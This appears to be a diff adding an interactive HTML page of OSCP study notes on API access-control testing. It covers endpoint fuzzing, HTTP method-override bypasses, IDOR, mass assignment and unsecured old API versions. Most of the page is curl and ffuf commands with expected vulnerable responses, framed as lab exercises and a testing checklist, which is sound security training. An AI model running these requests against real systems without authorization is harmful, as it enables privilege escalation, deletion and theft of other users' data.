@@ -1,0 +1,517 @@
+
+<style>
+  :root { --pad: 1.25rem; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: var(--font-mono, monospace); }
+
+  .wrapper { padding: 1.5rem 0; max-width: 680px; }
+
+  .page-title { font-size: 13px; font-weight: 500; color: var(--color-text-secondary); letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 0.4rem; }
+  .page-heading { font-size: 22px; font-weight: 500; color: var(--color-text-primary); margin-bottom: 0.3rem; }
+  .page-sub { font-size: 13px; color: var(--color-text-secondary); margin-bottom: 1.5rem; }
+
+  .tab-bar { display: flex; gap: 4px; border-bottom: 0.5px solid var(--color-border-tertiary); margin-bottom: 1.5rem; flex-wrap: wrap; }
+  .tab { padding: 7px 14px; font-size: 13px; font-weight: 400; color: var(--color-text-secondary); cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -0.5px; border-radius: 0; background: none; border-top: none; border-left: none; border-right: none; transition: color 0.15s; }
+  .tab:hover { color: var(--color-text-primary); }
+  .tab.active { color: var(--color-text-primary); border-bottom: 2px solid var(--color-text-primary); font-weight: 500; }
+
+  .section { display: none; }
+  .section.visible { display: block; }
+
+  .card { background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-lg); padding: var(--pad); margin-bottom: 1rem; }
+  .card-title { font-size: 14px; font-weight: 500; color: var(--color-text-primary); margin-bottom: 0.6rem; display: flex; align-items: center; gap: 8px; }
+  .card-body { font-size: 13px; color: var(--color-text-secondary); line-height: 1.7; }
+
+  .badge { display: inline-block; font-size: 11px; font-weight: 500; padding: 2px 8px; border-radius: var(--border-radius-md); }
+  .badge-red { background: #FCEBEB; color: #A32D2D; }
+  .badge-amber { background: #FAEEDA; color: #854F0B; }
+  .badge-green { background: #EAF3DE; color: #3B6D11; }
+  .badge-blue { background: #E6F1FB; color: #185FA5; }
+  .badge-gray { background: #F1EFE8; color: #5F5E5A; }
+
+  .code-block { background: var(--color-background-secondary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 0.9rem 1rem; font-family: var(--font-mono, monospace); font-size: 12px; color: var(--color-text-primary); line-height: 1.7; white-space: pre; overflow-x: auto; margin: 0.5rem 0; }
+  .code-comment { color: var(--color-text-tertiary); }
+  .code-method { color: #185FA5; font-weight: 500; }
+  .code-url { color: #3B6D11; }
+  .code-header { color: #854F0B; }
+  .code-value { color: #A32D2D; }
+  .code-flag { color: #533CB7; }
+
+  .step-list { counter-reset: steps; list-style: none; }
+  .step-list li { counter-increment: steps; display: flex; gap: 10px; margin-bottom: 0.6rem; font-size: 13px; color: var(--color-text-secondary); line-height: 1.6; }
+  .step-list li::before { content: counter(steps); min-width: 20px; height: 20px; background: var(--color-background-secondary); border: 0.5px solid var(--color-border-tertiary); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 500; color: var(--color-text-primary); flex-shrink: 0; margin-top: 2px; }
+
+  .bullet-list { list-style: none; }
+  .bullet-list li { font-size: 13px; color: var(--color-text-secondary); padding: 3px 0 3px 14px; position: relative; line-height: 1.6; }
+  .bullet-list li::before { content: "—"; position: absolute; left: 0; color: var(--color-text-tertiary); }
+
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 480px) { .two-col { grid-template-columns: 1fr; } }
+
+  .result-tag { display: inline-block; font-size: 11px; padding: 1px 7px; border-radius: 3px; margin-left: 6px; }
+  .result-vuln { background: #FCEBEB; color: #A32D2D; }
+  .result-safe { background: #EAF3DE; color: #3B6D11; }
+  .result-maybe { background: #FAEEDA; color: #854F0B; }
+
+  .divider { border: none; border-top: 0.5px solid var(--color-border-tertiary); margin: 1rem 0; }
+
+  .inline-label { font-size: 11px; font-weight: 500; color: var(--color-text-secondary); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 4px; display: block; }
+
+  .flow-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin: 8px 0; }
+  .flow-box { background: var(--color-background-secondary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 4px 10px; font-size: 12px; color: var(--color-text-primary); }
+  .flow-arrow { color: var(--color-text-tertiary); font-size: 14px; }
+
+  .checklist { list-style: none; }
+  .checklist li { display: flex; gap: 8px; font-size: 13px; color: var(--color-text-secondary); padding: 4px 0; line-height: 1.5; }
+  .checklist li i { color: var(--color-text-tertiary); font-size: 15px; margin-top: 1px; }
+
+  .method-pill { display: inline-block; font-size: 11px; font-weight: 500; padding: 2px 7px; border-radius: 3px; font-family: var(--font-mono); margin: 1px; }
+  .m-get { background: #E6F1FB; color: #185FA5; }
+  .m-post { background: #EAF3DE; color: #3B6D11; }
+  .m-put { background: #FAEEDA; color: #854F0B; }
+  .m-del { background: #FCEBEB; color: #A32D2D; }
+  .m-patch { background: #EEEDFE; color: #534AB7; }
+  .m-opt { background: #F1EFE8; color: #5F5E5A; }
+  .m-head { background: #FBEAF0; color: #993556; }
+</style>
+
+<div class="wrapper">
+  <h2 class="sr-only">API Access Control Testing — OSCP study notes covering HTTP method restriction bypass, endpoint enumeration, and practical lab examples</h2>
+
+  <p class="page-title">OSCP Study Notes</p>
+  <h1 class="page-heading">API Access Control Testing</h1>
+  <p class="page-sub">HTTP method restrictions · Endpoint data modification · Bypass techniques · Lab exercises</p>
+
+  <div class="tab-bar">
+    <button class="tab active" onclick="show('overview',this)">Overview</button>
+    <button class="tab" onclick="show('recon',this)">Recon</button>
+    <button class="tab" onclick="show('methods',this)">Method Bypass</button>
+    <button class="tab" onclick="show('detection',this)">Detection</button>
+    <button class="tab" onclick="show('labs',this)">Lab Examples</button>
+    <button class="tab" onclick="show('checklist',this)">Checklist</button>
+  </div>
+
+  <!-- OVERVIEW -->
+  <div id="overview" class="section visible">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-api" aria-hidden="true"></i> What we're testing</div>
+      <div class="card-body">
+        API access control vulnerabilities arise when servers enforce authorization only on <em>some</em> HTTP methods, or trust method-override headers, allowing an attacker to read/write data they shouldn't have access to.
+        <br><br>
+        Three core attack classes:
+      </div>
+      <br>
+      <div class="two-col">
+        <div style="border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 10px 12px;">
+          <span class="badge badge-red" style="margin-bottom:6px;">High Impact</span>
+          <div style="font-size:13px; font-weight:500; color:var(--color-text-primary); margin-bottom:4px;">Method-based auth bypass</div>
+          <div style="font-size:12px; color:var(--color-text-secondary);">Auth checked on POST but not PUT/PATCH/DELETE — same endpoint, different method, no enforcement.</div>
+        </div>
+        <div style="border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 10px 12px;">
+          <span class="badge badge-amber" style="margin-bottom:6px;">Medium Impact</span>
+          <div style="font-size:13px; font-weight:500; color:var(--color-text-primary); margin-bottom:4px;">HTTP method override</div>
+          <div style="font-size:12px; color:var(--color-text-secondary);">Smuggle DELETE inside a GET via <code>X-HTTP-Method-Override</code>, <code>_method</code> param, or <code>X-Method-Override</code>.</div>
+        </div>
+        <div style="border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 10px 12px;">
+          <span class="badge badge-amber" style="margin-bottom:6px;">Medium Impact</span>
+          <div style="font-size:13px; font-weight:500; color:var(--color-text-primary); margin-bottom:4px;">IDOR via param tampering</div>
+          <div style="font-size:12px; color:var(--color-text-secondary);">Object ID in URL/body not bound to authenticated user — change it to access another user's data.</div>
+        </div>
+        <div style="border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 10px 12px;">
+          <span class="badge badge-blue" style="margin-bottom:6px;">Recon</span>
+          <div style="font-size:13px; font-weight:500; color:var(--color-text-primary); margin-bottom:4px;">Undocumented endpoints</div>
+          <div style="font-size:12px; color:var(--color-text-secondary);">Hidden admin/debug/v0 endpoints visible in JS files, swagger specs, or route fuzzing.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-route" aria-hidden="true"></i> Attack flow summary</div>
+      <div class="card-body">
+        <div class="flow-row">
+          <div class="flow-box">Enumerate endpoints</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box">Map allowed methods</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box">Try forbidden methods</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box">Override headers</div>
+          <span class="flow-arrow">→</span>
+          <div class="flow-box">Tamper params / IDOR</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RECON -->
+  <div id="recon" class="section">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-zoom-scan" aria-hidden="true"></i> Step 1 — Endpoint discovery</div>
+      <div class="card-body">Sources to mine before touching the API:</div>
+      <br>
+      <ul class="bullet-list">
+        <li>JS bundles — grep for <code>/api/</code>, <code>/v1/</code>, <code>/admin/</code>, fetch() and axios() calls</li>
+        <li>Swagger / OpenAPI spec — check <code>/api-docs</code>, <code>/swagger.json</code>, <code>/openapi.yaml</code></li>
+        <li>Postman collections — sometimes exposed at <code>/postman_collection.json</code></li>
+        <li>robots.txt, sitemap.xml, .git/</li>
+        <li>Wayback Machine / CommonCrawl for old API paths</li>
+        <li>Mobile app APK/IPA decompilation (jadx, apktool, frida)</li>
+      </ul>
+      <br>
+      <span class="inline-label">Fuzz endpoints with wordlists</span>
+      <div class="code-block"><span class="code-method">ffuf</span> <span class="code-flag">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt <span class="code-flag">-u</span> <span class="code-url">https://target.com/api/v1/FUZZ</span> <span class="code-flag">-mc</span> 200,201,204,401,403 <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span>
+
+<span class="code-comment"># Try version enumeration</span>
+<span class="code-method">ffuf</span> <span class="code-flag">-w</span> versions.txt <span class="code-flag">-u</span> <span class="code-url">https://target.com/api/FUZZ/users</span>
+<span class="code-comment"># versions.txt: v1 v2 v3 v0 beta dev admin internal</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-list-check" aria-hidden="true"></i> Step 2 — Map methods per endpoint</div>
+      <div class="card-body">Use OPTIONS to discover what the server <em>claims</em> it supports, then test each one regardless.</div>
+      <br>
+      <div class="code-block"><span class="code-comment"># OPTIONS request to discover allowed methods</span>
+<span class="code-method">curl</span> <span class="code-flag">-X OPTIONS</span> <span class="code-url">https://target.com/api/v1/users/123</span> <span class="code-flag">-i</span>
+<span class="code-comment"># Look for: Allow: GET, POST  ← missing PUT/DELETE is interesting</span>
+
+<span class="code-comment"># Test every method manually regardless</span>
+<span class="code-keyword">for</span> method in GET POST PUT PATCH DELETE HEAD TRACE OPTIONS CONNECT; do
+  echo <span class="code-value">"=== $method ==="</span>
+  curl <span class="code-flag">-X $method</span> <span class="code-url">https://target.com/api/v1/users/123</span> \
+    <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;lowpriv_token&gt;"</span> <span class="code-flag">-si</span> | head -5
+done</div>
+      <br>
+      <span class="inline-label">Interesting response codes to watch</span>
+      <br>
+      <div style="margin-top:6px; display:flex; flex-wrap:wrap; gap:6px; font-size:12px;">
+        <span class="badge badge-green">200 OK — works, check response body</span>
+        <span class="badge badge-amber">204 No Content — action ran silently</span>
+        <span class="badge badge-amber">405 Method Not Allowed — but try override headers!</span>
+        <span class="badge badge-red">403 Forbidden — auth hit, but maybe bypassable</span>
+        <span class="badge badge-blue">401 Unauth — unauthenticated path found</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- METHOD BYPASS -->
+  <div id="methods" class="section">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-arrows-exchange" aria-hidden="true"></i> HTTP method override techniques</div>
+      <div class="card-body">Some frameworks (Rails, Laravel, old REST proxies) allow the HTTP verb to be overridden via headers or body params. The firewall/WAF sees <span class="method-pill m-get">GET</span> or <span class="method-pill m-post">POST</span>, but the app processes it as <span class="method-pill m-del">DELETE</span> or <span class="method-pill m-put">PUT</span>.</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Technique 1 — X-HTTP-Method-Override header</div>
+      <div class="code-block"><span class="code-comment"># Try forbidden method via override header</span>
+<span class="code-method">curl</span> <span class="code-flag">-X POST</span> <span class="code-url">https://target.com/api/v1/users/42</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"X-HTTP-Method-Override: DELETE"</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span> <span class="code-flag">-si</span>
+
+<span class="code-comment"># Also try these header variants:</span>
+<span class="code-flag">-H</span> <span class="code-header">"X-Method-Override: DELETE"</span>
+<span class="code-flag">-H</span> <span class="code-header">"X-HTTP-Method: DELETE"</span>
+<span class="code-flag">-H</span> <span class="code-header">"_method: DELETE"</span>        <span class="code-comment"># older PHP/Rails</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Technique 2 — _method query/body parameter</div>
+      <div class="code-block"><span class="code-comment"># Via query string</span>
+<span class="code-method">curl</span> <span class="code-flag">-X POST</span> <span class="code-url">"https://target.com/api/v1/users/42?_method=DELETE"</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span> <span class="code-flag">-si</span>
+
+<span class="code-comment"># Via form body</span>
+<span class="code-method">curl</span> <span class="code-flag">-X POST</span> <span class="code-url">https://target.com/api/v1/users/42</span> \
+  <span class="code-flag">-d</span> <span class="code-value">"_method=DELETE&amp;name=attacker"</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span> <span class="code-flag">-si</span>
+
+<span class="code-comment"># Via JSON body</span>
+<span class="code-method">curl</span> <span class="code-flag">-X POST</span> <span class="code-url">https://target.com/api/v1/users/42</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Content-Type: application/json"</span> \
+  <span class="code-flag">-d</span> <span class="code-value">'{"_method":"DELETE"}'</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span> <span class="code-flag">-si</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Technique 3 — Direct method use against unprotected verb</div>
+      <div class="card-body">Sometimes only GET is protected by auth. PUT, PATCH, DELETE on the same endpoint may be missing middleware.</div>
+      <br>
+      <div class="code-block"><span class="code-comment"># Normal user — PUT to update another user's data</span>
+<span class="code-method">curl</span> <span class="code-flag">-X PUT</span> <span class="code-url">https://target.com/api/v1/users/1</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;normal_user_token&gt;"</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Content-Type: application/json"</span> \
+  <span class="code-flag">-d</span> <span class="code-value">'{"role":"admin","email":"attacker@evil.com"}'</span>
+
+<span class="code-comment"># Expected: 403 Forbidden</span>
+<span class="code-comment"># Vulnerable: 200 OK / 204 No Content</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Technique 4 — IDOR through method + ID tampering</div>
+      <div class="card-body">Combine method access with direct object reference — read/modify other users' objects.</div>
+      <br>
+      <div class="code-block"><span class="code-comment"># Your account: /api/v1/orders/9001 — try other IDs</span>
+<span class="code-keyword">for</span> id in {9000..9010}; do
+  echo <span class="code-value">"--- ID: $id ---"</span>
+  curl <span class="code-flag">-s -X GET</span> <span class="code-url">https://target.com/api/v1/orders/$id</span> \
+    <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;your_token&gt;"</span> | python3 <span class="code-flag">-m json.tool</span>
+done
+
+<span class="code-comment"># Then try modifying another user's order:</span>
+<span class="code-method">curl</span> <span class="code-flag">-X PATCH</span> <span class="code-url">https://target.com/api/v1/orders/9005</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;your_token&gt;"</span> \
+  <span class="code-flag">-d</span> <span class="code-value">'{"status":"cancelled","discount":100}'</span></div>
+    </div>
+  </div>
+
+  <!-- DETECTION -->
+  <div id="detection" class="section">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-eye" aria-hidden="true"></i> Detecting whether bypass is possible</div>
+      <div class="card-body">Work through these signals to determine exploitability before investing deeper effort.</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="badge badge-green">Likely vulnerable</span></div>
+      <ul class="bullet-list" style="margin-top:8px;">
+        <li>OPTIONS response lists extra methods beyond what docs/UI suggest</li>
+        <li>Different HTTP methods return different status codes (GET→403, PUT→200)</li>
+        <li><code>X-HTTP-Method-Override</code> header changes the response body or status</li>
+        <li>Response body differs between <code>DELETE /res/1</code> and <code>POST /res/1?_method=DELETE</code></li>
+        <li>No <code>Allow</code> header returned at all — server ignores method entirely</li>
+        <li>Server returns <code>405</code> on direct call but <code>200</code> via override</li>
+        <li>Different auth middleware per route file (common in Express, Flask blueprints)</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><span class="badge badge-red">Not vulnerable / defend in depth</span></div>
+      <ul class="bullet-list" style="margin-top:8px;">
+        <li>All non-GET methods return 405 AND override headers produce same 405</li>
+        <li>CORS preflight strictly enforced — cross-origin methods blocked at proxy layer</li>
+        <li>Auth middleware is framework-global, not per-route (e.g., Express <code>app.use(auth)</code>)</li>
+        <li>Request body / query params containing <code>_method</code> are stripped before routing</li>
+        <li>WAF / API gateway enforces method allowlist before request hits app</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-help-circle" aria-hidden="true"></i> Ambiguous — investigate further</div>
+      <ul class="bullet-list" style="margin-top:8px;">
+        <li><code>403</code> on method: auth enforcement present, but check override headers</li>
+        <li><code>200</code> with empty body: may have run silently — verify side-effects out-of-band</li>
+        <li>Consistent status codes but response times differ: possible server-side processing</li>
+        <li>Framework uses method overriding middleware that you can't confirm is present</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-clock" aria-hidden="true"></i> Timing & side-effect verification</div>
+      <div class="card-body">A <code>204 No Content</code> tells you nothing about what happened. Verify effects:</div>
+      <br>
+      <ol class="step-list">
+        <li>Before attack: record baseline state (GET the target resource, note field values)</li>
+        <li>Execute the method under test (PUT/DELETE/PATCH)</li>
+        <li>GET the resource again — did it change? Was it deleted?</li>
+        <li>If deleting: try fetching — 404 confirms deletion</li>
+        <li>If updating: check the modified field values in the response</li>
+        <li>Check audit trail / logs if accessible (admin panel, debug endpoints)</li>
+      </ol>
+    </div>
+  </div>
+
+  <!-- LAB EXAMPLES -->
+  <div id="labs" class="section">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-terminal" aria-hidden="true"></i> Lab 1 — Broken function-level authorization</div>
+      <div class="card-body">
+        <span class="badge badge-gray">Setup</span> App has <code>GET /api/v1/users</code> (admin only) and <code>POST /api/v1/users</code> (admin only). You have a normal user JWT.
+      </div>
+      <br>
+      <span class="inline-label">Test</span>
+      <div class="code-block"><span class="code-comment"># 1. Confirm GET is blocked</span>
+curl <span class="code-flag">-s -X GET</span> <span class="code-url">https://lab/api/v1/users</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;user_jwt&gt;"</span>
+<span class="code-comment"># Response: 403 {"error":"Forbidden"}</span>
+
+<span class="code-comment"># 2. Try DELETE on a specific user</span>
+curl <span class="code-flag">-s -X DELETE</span> <span class="code-url">https://lab/api/v1/users/5</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;user_jwt&gt;"</span>
+<span class="code-comment"># Vulnerable response: 204 No Content  ← DELETE not protected!</span>
+
+<span class="code-comment"># 3. Confirm deletion</span>
+curl <span class="code-flag">-s -X GET</span> <span class="code-url">https://lab/api/v1/users/5</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;admin_jwt&gt;"</span>
+<span class="code-comment"># Response: 404 — user deleted by low-priv account</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-terminal" aria-hidden="true"></i> Lab 2 — Method override via header</div>
+      <div class="card-body">
+        <span class="badge badge-gray">Setup</span> <code>DELETE /api/v1/posts/7</code> returns 403. Test override headers.
+      </div>
+      <br>
+      <div class="code-block"><span class="code-comment"># Direct DELETE — blocked</span>
+curl <span class="code-flag">-X DELETE</span> <span class="code-url">https://lab/api/v1/posts/7</span> <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span>
+<span class="code-comment"># 403 Forbidden</span>
+
+<span class="code-comment"># Try POST with X-HTTP-Method-Override</span>
+curl <span class="code-flag">-X POST</span> <span class="code-url">https://lab/api/v1/posts/7</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"X-HTTP-Method-Override: DELETE"</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span>
+<span class="code-comment"># Vulnerable: 200 {"deleted":true}</span>
+
+<span class="code-comment"># Automation — try all override vectors</span>
+<span class="code-keyword">for</span> hdr in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
+  echo <span class="code-value">"Testing header: $hdr"</span>
+  curl <span class="code-flag">-s -X POST</span> <span class="code-url">https://lab/api/v1/posts/7</span> \
+    <span class="code-flag">-H</span> <span class="code-header">"$hdr: DELETE"</span> \
+    <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;token&gt;"</span> | head -c 100
+  echo
+done</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-terminal" aria-hidden="true"></i> Lab 3 — Mass assignment via unprotected PATCH</div>
+      <div class="card-body">
+        <span class="badge badge-gray">Setup</span> User profile update. POST checks ownership, but PATCH has no auth check. Bonus: server accepts extra fields (mass assignment).
+      </div>
+      <br>
+      <div class="code-block"><span class="code-comment"># Normal update path</span>
+curl <span class="code-flag">-X POST</span> <span class="code-url">https://lab/api/v1/profile</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;user_token&gt;"</span> \
+  <span class="code-flag">-d</span> <span class="code-value">'{"username":"alice"}'</span>
+<span class="code-comment"># 200 — updates only username</span>
+
+<span class="code-comment"># Try PATCH with extra fields (mass assignment)</span>
+curl <span class="code-flag">-X PATCH</span> <span class="code-url">https://lab/api/v1/profile</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;user_token&gt;"</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Content-Type: application/json"</span> \
+  <span class="code-flag">-d</span> <span class="code-value">'{"username":"alice","role":"admin","verified":true,"credits":99999}'</span>
+<span class="code-comment"># Vulnerable: 200 {"role":"admin","verified":true,...}  ← escalation!</span>
+
+<span class="code-comment"># Detect mass assignment by probing field names from JS source/OpenAPI spec</span>
+<span class="code-comment"># Look for: role, admin, isAdmin, verified, credits, balance, permissions</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-terminal" aria-hidden="true"></i> Lab 4 — IDOR with JWT sub claim</div>
+      <div class="card-body">
+        <span class="badge badge-gray">Setup</span> JWT contains <code>sub: 42</code>. API endpoint accepts user ID in URL. Server doesn't validate URL ID matches JWT sub.
+      </div>
+      <br>
+      <div class="code-block"><span class="code-comment"># Decode JWT (no verification needed)</span>
+echo <span class="code-value">"&lt;base64_payload&gt;"</span> | base64 -d | python3 <span class="code-flag">-m json.tool</span>
+<span class="code-comment"># {"sub": "42", "role": "user", ...}</span>
+
+<span class="code-comment"># Access your own data</span>
+curl <span class="code-flag">-X GET</span> <span class="code-url">https://lab/api/v1/users/42/documents</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;your_jwt&gt;"</span>
+<span class="code-comment"># 200 OK — your docs</span>
+
+<span class="code-comment"># Try another user's documents</span>
+curl <span class="code-flag">-X GET</span> <span class="code-url">https://lab/api/v1/users/1/documents</span> \
+  <span class="code-flag">-H</span> <span class="code-header">"Authorization: Bearer &lt;your_jwt&gt;"</span>
+<span class="code-comment"># Vulnerable: 200 OK with another user's documents</span>
+
+<span class="code-comment"># Also try: /api/v1/users/1/documents — PATCH/DELETE on their docs</span></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-terminal" aria-hidden="true"></i> Lab 5 — Unauthenticated access via old API version</div>
+      <div class="card-body">
+        <span class="badge badge-gray">Setup</span> <code>/api/v2/admin/users</code> requires auth. <code>/api/v1/admin/users</code> is an old version that was never properly secured.
+      </div>
+      <br>
+      <div class="code-block"><span class="code-comment"># v2 — properly secured</span>
+curl <span class="code-flag">-X GET</span> <span class="code-url">https://lab/api/v2/admin/users</span>
+<span class="code-comment"># 401 Unauthorized</span>
+
+<span class="code-comment"># v1 — auth never applied</span>
+curl <span class="code-flag">-X GET</span> <span class="code-url">https://lab/api/v1/admin/users</span>
+<span class="code-comment"># 200 OK — full user list, plaintext passwords, tokens, etc.</span>
+
+<span class="code-comment"># Version bruteforce</span>
+<span class="code-keyword">for</span> ver in v0 v1 v2 v3 v1.1 v2.0 beta dev internal legacy; do
+  code=$(curl <span class="code-flag">-s -o /dev/null -w "%{http_code}"</span> \
+    <span class="code-url">https://lab/api/$ver/admin/users</span>)
+  echo <span class="code-value">"$ver: $code"</span>
+done</div>
+    </div>
+  </div>
+
+  <!-- CHECKLIST -->
+  <div id="checklist" class="section">
+    <div class="card">
+      <div class="card-title"><i class="ti ti-clipboard-check" aria-hidden="true"></i> Testing checklist — run through every endpoint</div>
+      <br>
+      <span class="inline-label">Recon</span>
+      <ul class="checklist">
+        <li><i class="ti ti-square" aria-hidden="true"></i> Found Swagger/OpenAPI spec or JS route definitions</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Identified all API versions (v1, v2, beta, dev…)</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Fuzzed paths with api-focused wordlists</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Checked robots.txt, .well-known, /debug, /status, /health</li>
+      </ul>
+      <hr class="divider">
+      <span class="inline-label">Method testing</span>
+      <ul class="checklist">
+        <li><i class="ti ti-square" aria-hidden="true"></i> Sent OPTIONS to every interesting endpoint, noted Allow header</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tested every HTTP method manually (GET/POST/PUT/PATCH/DELETE/HEAD)</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tried X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method headers</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tried _method in query string and request body</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Verified side effects — GETted resource after supposed modification</li>
+      </ul>
+      <hr class="divider">
+      <span class="inline-label">Authorization</span>
+      <ul class="checklist">
+        <li><i class="ti ti-square" aria-hidden="true"></i> Repeated all requests without any Authorization header</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Replaced IDs in URLs/body with other users' IDs (IDOR)</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tested horizontal privilege escalation (user A accessing user B)</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tested vertical privilege escalation (user accessing admin endpoints)</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tried mass assignment — added undocumented fields (role, admin, credits)</li>
+      </ul>
+      <hr class="divider">
+      <span class="inline-label">Headers & encoding tricks</span>
+      <ul class="checklist">
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tried Content-Type: text/xml when server expects JSON (parser confusion)</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Sent HEAD request to check if endpoint exists without triggering full auth</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tried path traversal in object IDs: ../admin, %2e%2e%2fadmin</li>
+        <li><i class="ti ti-square" aria-hidden="true"></i> Tested with Accept: application/json vs text/html (different handlers)</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-title"><i class="ti ti-bookmark" aria-hidden="true"></i> Key tools</div>
+      <div class="two-col">
+        <div>
+          <span class="inline-label">Discovery</span>
+          <ul class="bullet-list">
+            <li>ffuf — path/parameter fuzzing</li>
+            <li>kiterunner (kr) — API route replay</li>
+            <li>arjun — hidden parameter discovery</li>
+            <li>swagger-ui — visualize OpenAPI specs</li>
+          </ul>
+        </div>
+        <div>
+          <span class="inline-label">Testing</span>
+          <ul class="bullet-list">
+            <li>Burp Suite — intercept/repeat/intruder</li>
+            <li>curl — manual method testing</li>
+            <li>httpx — fast bulk probing</li>
+            <li>jwt_tool — JWT manipulation</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <button style="width:100%; margin-top:4px;" onclick="sendPrompt('Can you give me a Burp Suite methodology for testing API method bypass vulnerabilities, including how to use Repeater and Intruder for this?')">Get Burp Suite methodology ↗</button>
+  </div>
+</div>
+
+<script>
+function show(id, btn) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('visible'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById(id).classList.add('visible');
+  btn.classList.add('active');
+}
+</script>
